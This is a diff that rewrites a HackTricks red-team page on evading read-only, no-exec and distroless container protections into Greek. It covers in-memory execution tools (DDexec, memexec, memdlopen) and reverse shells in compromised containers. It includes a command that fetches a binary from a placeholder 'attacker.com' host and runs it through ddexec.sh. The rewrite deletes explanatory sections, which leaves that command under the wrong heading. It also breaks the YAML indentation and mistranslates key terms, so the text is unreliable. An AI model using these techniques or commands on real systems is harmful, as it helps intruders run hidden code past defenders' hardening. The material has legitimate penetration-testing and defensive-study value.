@@ -1,87 +1,67 @@
-# Bypass FS protections: read-only / no-exec / Distroless
+# Παράκαμψη προστασίας του συστήματος αρχείων: μόνο για ανάγνωση / χωρίς εκτέλεση / Distroless
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.
 
 </details>
 
-## Videos
+## Βίντεο
 
-In the following videos you can find the techniques mentioned in this page explained more in depth:
+Στα παρακάτω βίντεο μπορείτε να βρείτε τις τεχνικές που αναφέρονται σε αυτήν τη σελίδα εξηγημένες πιο αναλυτικά:
 
-* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
-* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
+* [**DEF CON 31 - Εξερεύνηση της Αλλοίωσης και Αποφυγής της Μνήμης του Linux**](https://www.youtube.com/watch?v=poHirez8jk4)
+* [**Απόκρυψη εισβολών με το DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)
 
-## read-only / no-exec scenario
+## Σενάριο μόνο για ανάγνωση / χωρίς εκτέλεση
 
-It's more and more common to find linux machines mounted with **read-only (ro) file system protection**, specially in containers. This is because to run a container with ro file system is as easy as setting **`readOnlyRootFilesystem: true`** in the `securitycontext`:
+Είναι όλο και πιο συνηθισμένο να βρίσκονται linux μηχανές με **προστασία του συστήματος αρχείων μόνο για ανάγνωση (ro)**, ειδικά σε εμπορευματοκιβώτια. Αυτό συμβαίνει επειδή η εκτέλεση ενός εμπορευματοκιβωτίου με αρχείο συστήματος μόνο για ανάγνωση είναι τόσο εύκολη όσο η ρύθμιση **`readOnlyRootFilesystem: true`** στο `securitycontext`:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
 metadata:
-  name: alpine-pod
+name: alpine-pod
 spec:
-  containers:
-  - name: alpine
-    image: alpine
-    securityContext:
+containers:
+- name: alpine
+image: alpine
+securityContext:
 <strong>      readOnlyRootFilesystem: true
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-However, even if the file system is mounted as ro, **`/dev/shm`** will still be writable, so it's fake we cannot write anything in the disk. However, this folder will be **mounted with no-exec protection**, so if you download a binary here you **won't be able to execute it**.
+Ωστόσο, ακόμα κι αν το σύστημα αρχείων είναι προσαρτημένο ως ro, το **`/dev/shm`** θα παραμείνει εγγράψιμο, οπότε είναι ψεύτικο ότι δεν μπορούμε να γράψουμε οτιδήποτε στο δίσκο. Ωστόσο, αυτός ο φάκελος θα είναι **προσαρτημένος με προστασία χωρίς εκτέλεση**, οπότε αν κατεβάσετε ένα δυαδικό αρχείο εδώ **δεν θα μπορείτε να το εκτελέσετε**.
 
 {% hint style="warning" %}
-From a red team perspective, this makes **complicated to download and execute** binaries that aren't in the system already (like backdoors o enumerators like `kubectl`).
+Από την πλευρά της κόκκινης ομάδας, αυτό καθιστά **δύσκολη τη λήψη και εκτέλεση** δυαδικών που δεν υπάρχουν ήδη στο σύστημα (όπως πίσω πόρτες ή εργαλεία απαρίθμησης όπως το `kubectl`).
 {% endhint %}
 
-## Easiest bypass: Scripts
+## Ευκολότερη παράκαμψη: Σενάρια
 
-Note that I mentioned binaries, you can **execute any script** as long as the interpreter is inside the machine, like a **shell script** if `sh` is present or a **python** **script** if `python` is installed.
+Σημειώστε ότι αναφέρθηκα σε δυαδικά αρχεία, μπορείτε να **εκτελέσετε οποιοδήποτε σενάριο** όσο το διερμηνέας είναι μέσα στη μηχανή, όπως ένα **σενάριο κέλυφους** αν υπάρχει το `sh` ή ένα **σενάριο python** αν είναι εγκατεστημένο το `python`.
 
-However, this isn't just enough to execute your binary backdoor or other binary tools you might need to run.
+Ωστόσο, αυτό δεν είναι αρκετό για να εκτελέσετε τη δυαδική πίσω πόρτα ή άλλα δυαδικά εργαλεία που μπορεί να χρειαστεί να εκτελέσετε.
 
-## Memory Bypasses
+## Παράκαμψη μνήμης
 
-If you want to execute a binary but the file system isn't allowing that, the best way to do so is by **executing it from memory**, as the **protections doesn't apply in there**.
+Εάν θέλετε να εκτελέσετε ένα δυαδικό αρχείο αλλά το σύστημα αρχείων δεν το επιτρέπει, ο καλύτερος τρόπος να το κάνετε είναι να το **εκτελέσετε από τη μνήμη**, καθώς οι προστασίες δεν ισχύουν εκεί.
 
-### FD + exec syscall bypass
+### Παράκαμψη FD + exec syscall
 
-If you have some powerful script engines inside the machine, such as **Python**, **Perl**, or **Ruby** you could download the binary to execute from memory, store it in a memory file descriptor (`create_memfd` syscall), which isn't going to be protected by those protections and then call a **`exec` syscall** indicating the **fd as the file to execute**.
-
-For this you can easily use the project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). You can pass it a binary and it will generate a script in the indicated language with the **binary compressed and b64 encoded** with the instructions to **decode and decompress it** in a **fd** created calling `create_memfd` syscall and a call to the **exec** syscall to run it.
-
-{% hint style="warning" %}
-This doesn't work in other scripting languages like PHP or Node because they don't have any d**efault way to call raw syscalls** from a script, so it's not possible to call `create_memfd` to create the **memory fd** to store the binary.
-
-Moreover, creating a **regular fd** with a file in `/dev/shm` won't work, as you won't be allowed to run it because the **no-exec protection** will apply.
-{% endhint %}
-
-### DDexec / EverythingExec
-
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) is a technique that allows you to **modify the memory your own process** by overwriting its **`/proc/self/mem`**.
-
-Therefore, **controlling the assembly code** that is being executed by the process, you can write a **shellcode** and "mutate" the process to **execute any arbitrary code**.
-
-{% hint style="success" %}
-**DDexec / EverythingExec** will allow you to load and **execute** your own **shellcode** or **any binary** from **memory**.
-{% endhint %}
-
+Εάν έχετε ισχυρούς μηχανισμούς σεναρίων μέσα στη μηχανή, όπως **Python**, **Perl** ή **Ruby**, μπορείτε να κατεβάσετε το δυαδικό αρχείο για εκτέλεση από τη μνήμη, να το αποθηκεύσετε σε έναν περιγραφέα αρχείου μνήμης (`create_memfd` syscall), ο οποίος δεν θα προστατεύεται από αυτές τις προστασίες, και στη συνέχεια να καλέσετε ένα **`exec` syscall** δηλώνοντας τον **fd ως το αρχείο που θα εκτελεστεί**.
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
-
-For more information about this technique check the Github or:
+Για περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική, ελέγξτε το Github ή:
 
 {% content-ref url="ddexec.md" %}
 [ddexec.md](ddexec.md)
@@ -89,54 +69,52 @@ For more information about this technique check the Github or:
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) is the natural next step of DDexec. It's a **DDexec shellcode demonised**, so every time that you want to **run a different binary** you don't need to relaunch DDexec, you can just run memexec shellcode via the DDexec technique and then **communicate with this deamon to pass new binaries to load and run**.
+[**Memexec**](https://github.com/arget13/memexec) είναι το φυσικό επόμενο βήμα του DDexec. Είναι ένας **DDexec shellcode δαιμονισμένος**, οπότε κάθε φορά που θέλετε να **εκτελέσετε ένα διαφορετικό δυαδικό αρχείο** δεν χρειάζεται να ξαναξεκινήσετε το DDexec, μπορείτε απλά να εκτελέσετε τον κώδικα shell του memexec μέσω της τεχνικής DDexec και στη συνέχεια να **επικοινωνήσετε με αυτόν τον δαίμονα για να περάσετε νέα δυαδικά αρχεία για φόρτωση και εκτέλεση**.
 
-You can find an example on how to use **memexec to execute binaries from a PHP reverse shell** in [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
+Μπορείτε να βρείτε ένα παράδειγμα για το πώς να χρησιμοποιήσετε το **memexec για να εκτελέσετε δυαδικά αρχεία από ένα ανάποδο κέλυφος PHP** στο [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).
 
 ### Memdlopen
 
-With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique allows an **easier way to load binaries** in memory to later execute them. It could allow even to load binaries with dependencies.
+Με παρόμοιο σκοπό με το DDexec, η τεχνική [**memdlopen**](https://github.com/arget13/memdlopen) επιτρέπει έναν **ευκολότερο τρόπο φόρτωσης δυαδικών αρχείων** στη μνήμη για να τα εκτελέσετε αργότερα. Μπορεί ακόμα να επιτρέψει τη φόρτωση δυαδικών αρχείων με εξαρτήσεις.
 
-## Distroless Bypass
+## Διάβασμα Διανομής
 
-### What is distroless
+### Τι είναι η διανομή
 
-Distroless containers contain only the **bare minimum components necessary to run a specific application or service**, such as libraries and runtime dependencies, but exclude larger components like a package manager, shell, or system utilities.
+Οι διανομές χωρίς διανομές περιέχουν μόνο τα **απαραίτητα στοιχεία για να εκτελέσουν μια συγκεκριμένη εφαρμογή ή υπηρεσία**, όπως βιβλιοθήκες και εξαρτήσεις χρόνου εκτέλεσης, αλλά αποκλείουν μεγαλύτερα στοιχεία όπως ένας διαχειριστής πακέτων, κέλυφος ή δημόσιες υπηρεσίες.
 
-The goal of distroless containers is to **reduce the attack surface of containers by eliminating unnecessary components** and minimising the number of vulnerabilities that can be exploited.
+Ο στόχος των διανομών χωρίς διανομές είναι να **μειώσουν την επιθετική επιφάνεια των διανομών αποκλείοντας περιττά στοιχεία** και μειώνοντας τον αριθμό των ευπαθειών που μπορούν να εκμεταλλευτούν.
 
-### Reverse Shell
+### Ανάποδο Κέλυφος
 
-In a distroless container you might **not even find `sh` or `bash`** to get a regular shell. You won't also find binaries such as `ls`, `whoami`, `id`... everything that you usually run in a system.
+Σε ένα δοχείο χωρίς διανομή, μπορεί **ακόμα και να μην βρείτε το `sh` ή το `bash`** για να πάρετε ένα κανονικό κέλυφος. Δεν θα βρείτε επίσης δυαδικά όπως `ls`, `whoami`, `id`... όλα όσα συνήθως εκτελείτε σε ένα σύστημα.
 
 {% hint style="warning" %}
-Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.
+Συνεπώς, **δεν θα μπορέσετε** να πάρετε ένα **ανάποδο κέλυφος** ή να **απαριθμήσετε** το σύστημα όπως συνήθως.
 {% endhint %}
 
-However, if the compromised container is running for example a flask web, then python is installed, and therefore you can grab a **Python reverse shell**. If it's running node, you can grab a Node rev shell, and the same with mostly any **scripting language**.
+Ωστόσο, αν το πειρατευμένο δοχείο εκτελεί για παράδειγμα έναν ιστότοπο flask, τότε έχει εγκατεστημένη την Python και, συνεπώς, μπορείτε να πάρετε ένα **ανάποδο κέλυφος Python**. Αν εκτελείτε τον κόμβο, μπορείτε να πάρετε ένα ανάποδο κέλυφος Node, και το ίδιο ισχύει για σχεδόν οποιαδήποτε **γλώσσα σεναρίων**.
 
 {% hint style="success" %}
-Using the scripting language you could **enumerate the system** using the language capabilities.
+Χρησιμοποιώντας τη γλώσσα σεναρίων, μπορείτε να **απαριθμήσετε το σύστημα** χρησιμοποιώντας τις δυνατότητες της γλώσσας.
 {% endhint %}
 
-If there is **no `read-only/no-exec`** protections you could abuse your reverse shell to **write in the file system your binaries** and **execute** them.
+Αν δεν υπάρχουν προστασίες **`read-only/no-exec`**, μπορείτε να καταχραστείτε το ανάποδο κέλυφος σας για να **γράψετε στο σύστημα αρχεία δυαδικών** και να τα **εκτελέσετε**.
 
 {% hint style="success" %}
-However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.
+Ωστόσο, σε αυτού του είδους τα δοχεία, αυτές οι προστασίες συνήθως υπάρχουν, αλλά μπορείτε να χρησιμοποιήσετε τις **προηγούμενες τεχνικές εκτέλεσης στη μνήμη για να τις παρακάμψετε**.
 {% endhint %}
 
-You can find **examples** on how to **exploit some RCE vulnerabilities** to get scripting languages **reverse shells** and execute binaries from memory in [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Μπορείτε να βρείτε **παραδείγματα** για το πώς να **εκμεταλλευτείτε ορισμένες ευπάθειες RCE** για να πάρετε **ανάποδα κέλυφα γλωσσών σεναρίων** και να εκτελέσετε δυαδικά αρχεία από τη μνήμη στο [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Άλλοι τρόποι για να υποστηρίξετε το HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
-
-</details>
+* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Μοιραστείτε τα κόλπα σ
